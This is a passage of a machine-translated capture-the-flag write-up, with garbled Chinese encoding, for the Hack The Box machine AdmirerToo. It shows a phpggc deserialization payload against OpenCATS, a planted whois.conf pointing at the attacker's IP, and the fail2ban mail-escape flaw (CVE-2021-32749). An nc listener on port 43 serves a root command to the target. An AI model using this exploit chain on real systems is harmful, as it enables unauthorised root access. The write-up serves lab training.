src="../Images/fd2b5345c263671146a362e0a1a96543.png" data-original-src="https://miro.medium.com/v2/resize:fit:1250/format:webp/0*PhlVq50A1PqosFOR.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">ç”¨æ‰“å—æ‹¦æˆªOpenCatsè¯·æ±‚</figcaption></figure><p id="e080" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">åœ¨Burpä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°ActivityDataGridå‚æ•°åé¢æœ‰ä¸€ä¸ªåºåˆ—åŒ–çš„å­—ç¬¦ä¸²:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi oh"><img src="../Images/710804d13953b6829785e9c4cb9c4602.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*4PdBgnQ3DGSXO3Tq.png"/></div></div></figure><h1 id="cd50" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">phpggc</h1><p id="683e" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">æˆ‘ä»¬å¯ä»¥ä¸ºæˆ‘ä»¬è‡ªå·±çš„ä»£ç æ”¹å˜è¿™ä¸€ç‚¹ï¼Œå¹¶åœ¨ç›’å­ä¸Šæ”¾ä¸€ä¸ªæ–‡ä»¶ã€‚æŒ‰ç…§è¯´æ˜ä½¿ç”¨<a class="ae nu" href="https://github.com/ambionics/phpggc" rel="noopener ugc nofollow" target="_blank"> phpggc </a>:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="64ab" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/admirertoo]<br/>â””â”€# phpggc             <br/>Command 'phpggc' not found, but can be installed with:<br/>apt install phpggc<br/>Do you want to install it? (N/y)y<br/>apt install phpggc<br/>Reading package lists... Done<br/>Building dependency tree... Done<br/>Reading state information... Done<br/>The following NEW packages will be installed:<br/>  phpggc<br/>0 upgraded, 1 newly installed, 0 to remove and 587 not upgraded.<br/>Need to get 40.1 kB of archives.<br/>After this operation, 423 kB of additional disk space will be used.<br/>Get:1 https://archive-4.kali.org/kali kali-rolling/main amd64 phpggc all 0.20210218-0kali1 [40.1 kB]<br/>Fetched 40.1 kB in 1s (40.6 kB/s) <br/>Selecting previously unselected package phpggc.<br/>(Reading database ... 305301 files and directories currently installed.)<br/>Preparing to unpack .../phpggc_0.20210218-0kali1_all.deb ...<br/>Unpacking phpggc (0.20210218-0kali1) ...<br/>Setting up phpggc (0.20210218-0kali1) ...<br/>Processing triggers for kali-menu (2021.4.2) ...</span></pre><p id="0393" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å¦‚æœéœ€è¦ï¼Œå®‰è£…ã€‚ç°åœ¨åˆ›å»ºæˆ‘ä»¬çš„æµ‹è¯•æ–‡ä»¶å¹¶ä½¿ç”¨phpggcç»™æˆ‘ä»¬ä¸€ä¸ªåºåˆ—åŒ–çš„å¯¹è±¡:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="b78f" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/admirertoo]<br/>â””â”€# echo "this is a test" &gt; pencer.txt<br/><br/>â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/admirertoo]<br/>â””â”€# phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/pencer.txt /root/htb/admirertoo/pencer.txt <br/>a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A41%3A%22%00GuzzleHttp%5CCookieJar%00filename%22%3Bs%3A17%3A%22%2Fdev%2Fshm%2Fpencer.txt%2&lt;SNIP&gt;%3B%7D</span></pre><h1 id="5b27" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">æ–‡ä»¶ä¸¢å¼ƒ</h1><p id="5219" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">ç°åœ¨ç²˜è´´åˆ°æ‰“å—ï¼Œå¹¶æ›¿æ¢å·²ç»å­˜åœ¨çš„:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi oi"><img src="../Images/e3d77c7d2064d596d816075c5e92f1ec.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*URVY1zEpcFNPP97H.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">å°†æœ‰æ•ˆè´Ÿè½½ç²˜è´´åˆ°æ‰“å—</figcaption></figure><p id="76ab" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ä½¿ç”¨ä¸­ç»§å™¨å‘é€è¯·æ±‚ï¼Œæˆ‘ä»¬çœ‹åˆ°ä¸€ä¸ª200 OKå“åº”ã€‚åˆ‡æ¢åˆ°æœºå™¨ä¸Šçš„SSHä¼šè¯ï¼Œæ£€æŸ¥æˆ‘ä»¬åˆšæ‰æ”¾åœ¨é‚£é‡Œçš„æ–‡ä»¶:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="997d" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ ls -l /dev/shm/<br/>4 -rw-r--r--  1 devel devel   58 Mar  3 21:46 pencer.txt</span><span id="21ab" class="nn kg iq nj b gy nv np l nq nr">jennifer@admirertoo:~$ cat /dev/shm/pencer.txt <br/>[{"Expires":1,"Discard":false,"Value":"this is a test\n"}]</span></pre><p id="8bd8" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">è¯¥æ–‡ä»¶å±äºå¦ä¸€ä¸ªåä¸ºdevelçš„ç”¨æˆ·ã€‚æˆ‘ä»¬å¯ä»¥æŸ¥æ‰¾ç”¨æˆ·æœ‰æƒè®¿é—®çš„ä½ç½®:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="bf8c" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ find / -group devel 2&gt;/dev/null<br/>/dev/shm/test.txt<br/>/opt/opencats/INSTALL_BLOCK<br/>/usr/local/src<br/>/usr/local/etc</span></pre><h1 id="68d9" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">å¤±è´¥2ç­</h1><p id="6e0c" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">ç°åœ¨æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ç§æ–¹æ³•ï¼Œåˆ©ç”¨develç”¨æˆ·çš„èº«ä»½å°†æˆ‘ä»¬é€‰æ‹©çš„æ–‡ä»¶æ”¾åœ¨å…¶ä¸­ä¸€ä¸ªä½ç½®ã€‚ä¸‹ä¸€éƒ¨åˆ†èŠ±äº†æˆ‘å¤ªé•¿æ—¶é—´æ‰å¼„æ˜ç™½ï¼</p><p id="47f9" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ç¯é¡¾å››å‘¨ï¼Œæˆ‘æ³¨æ„åˆ°å®‰è£…äº†fail2ban:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="f83f" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ ls -l /etc/fail2ban/<br/>drwxr-xr-x 2 root root  4096 Jul 19  2021 action.d<br/>-rw-r--r-- 1 root root  2334 Jan 18  2018 fail2ban.conf<br/>drwxr-xr-x 2 root root  4096 Sep 23  2018 fail2ban.d<br/>drwxr-xr-x 3 root root  4096 Jul 19  2021 filter.d<br/>-rw-r--r-- 1 root root 22897 Jan 18  2018 jail.conf<br/>drwxr-xr-x 2 root root  4096 Jul 19  2021 jail.d<br/>-rw-r--r-- 1 root root   167 Jul 19  2021 jail.local<br/>-rw-r--r-- 1 root root   645 Jan 18  2018 paths-arch.conf<br/>-rw-r--r-- 1 root root  2827 Jan 18  2018 paths-common.conf<br/>-rw-r--r-- 1 root root   573 Jan 18  2018 paths-debian.conf<br/>-rw-r--r-- 1 root root   738 Jan 18  2018 paths-opensuse.conf</span></pre><p id="226a" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æ£€æŸ¥æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒæ­£åœ¨è¿è¡Œ:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="e89d" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ systemctl status fail2ban.service <br/>â— fail2ban.service - Fail2Ban Service<br/>   Loaded: loaded (/lib/systemd/system/fail2ban.service; enabled; vendor preset: enabled)<br/>   Active: active (running) since Thu 2022-03-03 21:29:26 GMT;<br/>     Docs: man:fail2ban(1)<br/>  Process: 445 ExecStartPre=/bin/mkdir -p /var/run/fail2ban (code=exited, status=0/SUCCESS)<br/> Main PID: 459<br/>    Tasks: 3 (limit: 4701)<br/>   Memory: 22.6M<br/>   CGroup: /system.slice/fail2ban.service<br/>           â””â”€459 /usr/bin/python3 /usr/bin/fail2ban-server -xf start</span></pre><p id="f02e" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æŸ¥çœ‹é…ç½®ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒåœ¨ä¿æŠ¤sshï¼Œå¹¶è®¾ç½®ä¸ºåœ¨æ”¶åˆ°è­¦æŠ¥æ—¶å‘é€ç”µå­é‚®ä»¶:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="0b32" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ cat /etc/fail2ban/jail.d/defaults-debian.conf<br/>[sshd]<br/>enabled = true</span><span id="2247" class="nn kg iq nj b gy nv np l nq nr">jennifer@admirertoo:~$ cat /etc/fail2ban/jail.local<br/>[DEFAULT]<br/>ignoreip = 127.0.0.1<br/>bantime = 60s<br/>destemail = root@admirertoo.htb<br/>sender = fail2ban@admirertoo.htb<br/>sendername = Fail2ban<br/>mta = mail<br/>action = %(action_mwl)s</span></pre><p id="ed7f" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æ£€æŸ¥å®‰è£…çš„ç‰ˆæœ¬ï¼Œæˆ‘ä»¬å‘ç°å®ƒæ˜¯æ—§çš„:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="2753" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ fail2ban-server --version<br/>Fail2Ban v0.10.2</span></pre><p id="898b" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated"><a class="ae nu" href="https://github.com/fail2ban/fail2ban/releases#:~:text=a454884-,0.10.,burns%2Dlike%2Dthe%2Dcold" rel="noopener ugc nofollow" target="_blank">2018å¹´å‘å¸ƒ0.10.2ç‰ˆæœ¬</a>ã€‚ä¸€ä¸ªæœç´¢æ‰¾åˆ°<a class="ae nu" href="https://nvd.nist.gov/vuln/detail/CVE-2021-32749" rel="noopener ugc nofollow" target="_blank">CVE-2021â€“32749</a>ä¸ºå®ƒã€‚ä¸€ç‚¹é˜…è¯»å‘ç°<a class="ae nu" href="https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2021-32749" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>å¯¼è‡´<a class="ae nu" href="https://research.securitum.com/fail2ban-remote-code-execution/" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>ç ”ç©¶å’Œè¿™ä¸ª<a class="ae nu" href="https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm" rel="noopener ugc nofollow" target="_blank">å’¨è¯¢</a>ã€‚</p><p id="fceb" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ä»æ‰€æœ‰é˜…è¯»ä¸­å¾—åˆ°çš„å…³é”®ä¿¡æ¯æ˜¯è¿™ä¸€ç‚¹:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="feae" class="nn kg iq nj b gy no np l nq nr">The â€˜~|â€™ escape pipes the message composed so far through the given shell command and replaces the message with the output the command produced. If the command produced no output, mail assumes that something went wrong and retains the old contents of your message.</span></pre><p id="3495" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æœ‰äº†å®ƒï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä»¥rootç”¨æˆ·èº«ä»½è¿è¡Œçš„Fail2BanæœåŠ¡çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œåœ¨æœºå™¨ä¸Šæ‰§è¡Œæˆ‘ä»¬é€‰æ‹©çš„ä»£ç ã€‚æˆ‘ä»¬ä»é…ç½®æ–‡ä»¶ä¸­çŸ¥é“ï¼Œè¦è§¦å‘å®ƒï¼Œæˆ‘ä»¬åªéœ€å‡ æ¬¡ç™»å½•SSHå¤±è´¥ã€‚æ£˜æ‰‹çš„éƒ¨åˆ†æ˜¯æˆ‘ä»¬å¦‚ä½•å°†æˆ‘ä»¬çš„è½¬ä¹‰åºåˆ—æ³¨å…¥åˆ°ç”Ÿæˆçš„é‚®ä»¶ä¸­ï¼Œç­”æ¡ˆæ¥è‡ªè¿™é‡Œçš„å’¨è¯¢<a class="ae nu" href="https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm" rel="noopener ugc nofollow" target="_blank"/>:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="dd70" class="nn kg iq nj b gy no np l nq nr">This strictly puts whois command output of banned IP address into email. So if attacker could get control over whois output of his own IP address - code execution could be achieved (with root, which is more fun of course).</span></pre><h1 id="a1a1" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">Whoisé…ç½®æ¼æ´</h1><p id="9c86" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">è¿™ä½¿æˆ‘ä»¬å›åˆ°è¿™æ ·ä¸€ä¸ªäº‹å®ï¼Œå³æˆ‘ä»¬å¯ä»¥é€šè¿‡OpenCATSçš„un-serializeæ¼æ´å°†ä¸€ä¸ªæ–‡ä»¶ä½œä¸ºç”¨æˆ·devel in /usr/local/etcåˆ é™¤ã€‚Whoisä½¿ç”¨é…ç½®æ–‡ä»¶åˆ—å‡ºå…¬å…±whoisæœåŠ¡å™¨ã€‚è¿™ä¸ªç‰ˆæœ¬çš„whoisçš„æ–‡æ¡£è¯´:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="d216" class="nn kg iq nj b gy no np l nq nr">The configuration file should reside in the /usr/local/etc directory, or the directory that you specified using the --sysconfdir switch to the configure script.</span></pre><p id="57f5" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å› æ­¤ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªwhois.confæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶æŒ‡å‘æˆ‘ä»¬çš„Kali IPï¼Œå½“å®ƒæŸ¥æ‰¾Fail2Banå°†é˜»æ­¢çš„IPæ—¶ï¼Œå°†ä½¿ç”¨è¯¥IPã€‚ä¸ºäº†å®ç°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å¿…é¡»åœ¨æˆ‘ä»¬çš„confæ–‡ä»¶ä¸­ä½¿ç”¨ä¸€ä¸ªRegexè¡¨è¾¾å¼ï¼Œè¿™æ˜¯å› ä¸ºphpggcå¯¹è¾“å…¥è¿›è¡Œç¼–ç çš„æ–¹å¼ã€‚</p><p id="c0c9" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ä¾‹å¦‚ï¼Œå¦‚æœæˆ‘ä»¬è¿™æ ·åš:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="e625" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/admirertoo]<br/>â””â”€# echo "[10.10.14.169]" &gt; whois.conf</span></pre><p id="495d" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ç„¶åï¼Œåœ¨ç¼–ç å¹¶æ”¾åœ¨ç›’å­ä¸Šä¹‹åï¼Œå®ƒå°†çœ‹èµ·æ¥åƒè¿™æ ·:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="7d0f" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ cat/usr/local/etc/whois.conf<br/>[{"Expires":1,"Discard":false,"Value":"[10.10.14.169]\n"}]</span></pre><p id="d2ea" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">è¿™æ˜¯æ— æ•ˆçš„ï¼Œå½“ä½ è¯•å›¾ä½¿ç”¨ç›’å­ä¸Šçš„whoisæ—¶ä¼šå‡ºç°é”™è¯¯ã€‚ç›¸åï¼Œæˆ‘ä»¬åƒè¿™æ ·ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="2e46" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/admirertoo]<br/>â””â”€# echo "}]|. [10.10.14.169]" &gt; whois.conf</span></pre><p id="de74" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å½“å®ƒæ”¾åœ¨ç›’å­ä¸Šæ—¶ï¼Œçœ‹èµ·æ¥åƒè¿™æ ·:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="1925" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ cat /usr/local/etc/whois.conf<br/>[{"Expires":1,"Discard":false,"Value":"}]|. [10.10.14.169]\n"}]</span></pre><p id="80ca" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼Œç«–çº¿æ˜¯ä¸€ä¸ªæˆ–ï¼Œç‚¹æ˜¯æ–¹æ‹¬å·å†…çš„åŒ¹é…å­—ç¬¦ã€‚è¿™æ„å‘³ç€å°½ç®¡å½“whoisè§£æconfæ–‡ä»¶æ—¶ï¼Œå®ƒåŒ…å«æ— æ•ˆæ•°æ®ã€‚å¯¼è‡´å®ƒåªä½¿ç”¨æ‹¬å·å†…çš„å­—ç¬¦ã€‚è¿™æ˜¯æˆ‘ä»¬ç­‰å¾…çš„Kali IPçš„æœ‰æ•ˆIPåœ°å€ã€‚</p><p id="fb9d" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">è®©æˆ‘ä»¬å¼€å§‹å§ã€‚é¦–å…ˆåˆ›å»ºæˆ‘ä»¬çš„whois.confæ–‡ä»¶:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="117e" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/admirertoo]<br/>â””â”€# echo "}]|. [10.10.14.169]" &gt; whois.conf</span></pre><p id="eb67" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ä½¿ç”¨phpgccå¯¹å…¶è¿›è¡Œåºåˆ—åŒ–ï¼Œå¹¶å°†å…¶æ”¾å…¥æœºå™¨ä¸Šçš„/usr/local/etcæ–‡ä»¶å¤¹ä¸­:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="37de" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/admirertoo]<br/>â””â”€# phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf /root/htb/admirertoo/whois.conf<br/>a%3A2%3A%7Bi%3A7&lt;SNIP&gt;Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A20%3A%22%7D%5D%7C.+%5B10.10.14.169%5D%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3B%7Di%3A7%3Bi%3A7%3B%7D</span></pre><p id="008e" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å›åˆ°Burpï¼Œåƒä»¥å‰ä¸€æ ·æ•è·æ´»åŠ¨æ•°æ®ç½‘æ ¼è¯·æ±‚ï¼Œç”¨æˆ‘ä»¬çš„å†…å®¹æ›¿æ¢å¼€å§‹æ—¶çš„åºåˆ—åŒ–å†…å®¹:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi oj"><img src="../Images/92a4251e9be5ebe671b45000aa716494.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*apGbM1T8iFCKMlGK.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">ç”¨Burpæ•è·è¯·æ±‚ï¼Œå¹¶å°†åºåˆ—åŒ–çš„æœ‰æ•ˆè´Ÿè½½æ”¾å…¥å…¶ä¸­</figcaption></figure><p id="832b" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å‘é€åˆ°é‚®ç®±ï¼Œç„¶ååˆ‡æ¢åˆ°æˆ‘ä»¬çš„SSHä¼šè¯ï¼Œä»¥Jenniferçš„èº«ä»½è¿æ¥ã€‚ç¡®ä¿æ–‡ä»¶åœ¨é‚£é‡Œ:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="5e55" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ cat /usr/local/etc/whois.conf <br/>[{"Expires":1,"Discard":false,"Value":"}]|. [10.10.14.169]\n"}]</span></pre><p id="8feb" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">åœ¨Kaliä¸Šåˆ›å»ºä¸€ä¸ªæœ‰æ•ˆè´Ÿè½½ï¼Œæˆ‘ä»¬å¸Œæœ›å°†å®ƒæ³¨å…¥åˆ°ç”µå­é‚®ä»¶ä¸­ï¼Œå¹¶åœ¨æœºå™¨ä¸Šæ‰§è¡Œã€‚æˆ‘æœ¬æ¥å¯ä»¥ä½¿ç”¨åå‘shellï¼Œä½†æ˜¯ä¸ºäº†ç®€å•èµ·è§ï¼Œæˆ‘åªæ˜¯å¤åˆ¶äº†æ ¹æ ‡å¿—:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="322c" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/admirertoo]<br/>â””â”€# cat flag_copy.txt<br/>~| bash -c "cp /root/root.txt /tmp/root.txt &amp;&amp; chmod 777 /tmp/root.txt" &amp;</span></pre><p id="5ea1" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">è¯·æ³¨æ„ï¼Œæˆ‘è¦æ‰§è¡Œçš„ä»£ç ä»¥~|å¼€å¤´ï¼Œå®ƒåœ¨Fail2Banæ¼æ´åˆ©ç”¨ä¸­è¢«æ ‡è¯†ä¸ºæ³¨å…¥æ–¹å¼ã€‚ç°åœ¨ï¼Œåœ¨æœ¬åœ°ç«¯å£43ä¸Šå¯åŠ¨ncä¾¦å¬ï¼Œè¿™æ˜¯whoiså°†ä¸æˆ‘ä»¬å¯¹è¯çš„å†…å®¹:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="02de" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/admirertoo]<br/>â””â”€# nc -nvlkp 43 -c "cat /root/htb/admirertoo/flag_copy.txt"<br/>listening on [any] 43 ...</span></pre><h1 id="0a47" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">æ ¹æ ‡å¿—</h1><p id="9e3c" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">ç°åœ¨ï¼Œç™»å½•SSHå¤±è´¥ä¸‰æ¬¡ï¼Œå¯¼è‡´Fail2Banå‘é€ç”µå­é‚®ä»¶ï¼Œè¯¥ç”µå­é‚®ä»¶å°†ä½¿ç”¨whoisæŸ¥æ‰¾æˆ‘ä»¬çš„IPï¼Œç”±äºæˆ‘ä»¬ä¸¢å¼ƒäº†whois.confæ–‡ä»¶ï¼Œè¯¥ç”µå­é‚®ä»¶å°†è¢«é‡å®šå‘åˆ°æˆ‘ä»¬ç­‰å¾…çš„ncä¾¦å¬å™¨ï¼Œè¿™åˆå°†å‘é€å›åŒ…å«æˆ‘ä»¬cpçš„æ–‡æœ¬æ–‡ä»¶:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="1fa7" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/admirertoo]<br/>â””â”€# ssh -L 1234:127.0.0.1:8080 jennifer@admirer-gallery.htb<br/>jennifer@admirer-gallery.htbs password: <br/>Permission denied, please try again.<br/>jennifer@admirer-gallery.htbs password: <br/>Permission denied, please try again.<br/>jennifer@admirer-gallery.htbs password: <br/>jennifer@admirer-gallery.htb: Permission denied (publickey,password).</span></pre><p id="95f7" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ç°åœ¨ï¼Œä½œä¸ºJenniferï¼Œæˆ‘ä»¬ç»ˆäºå¯ä»¥è®¿é—®/tmpæ–‡ä»¶å¤¹ä¸­çš„æ ¹æ ‡å¿—äº†:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="bb0b" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ cat /tmp/root.txt <br/>e3eeb41b4e22ad1ca6419cf2501b2ab2</span></pre><p id="016c" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å®Œæˆäº†ã€‚ä¸‹æ¬¡è§ã€‚</p></div><div class="ab cl ok ol hu om" role="separator"><span class="on bw bk oo op oq"/><span class="on bw bk oo op oq"/><span class="on bw bk oo op"/></div><div class="ij ik il im in"><p id="b382" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å¦‚æœä½ å–œæ¬¢è¿™ç¯‡æ–‡ç« ï¼Œè¯·ç»™æˆ‘ä¸€ä¸¤ä¸ªæŒå£°(è¿™æ˜¯å…è´¹çš„ï¼)</p><p id="0b8c" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æ¨ç‰¹â€”<a class="ae nu" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>ç½‘ç«™â€” <a class="ae nu" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="ba0c" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated"><em class="or">åŸè½½äº2022å¹´6æœˆ12æ—¥</em><a class="ae nu" href="https://pencer.io/ctf/ctf-htb-admirertoo" rel="noopener ugc nofollow" target="_blank"><em class="or">https://pencer . io</em></a><em class="or">ã€‚</em></p></div></div>    
</body>
</html>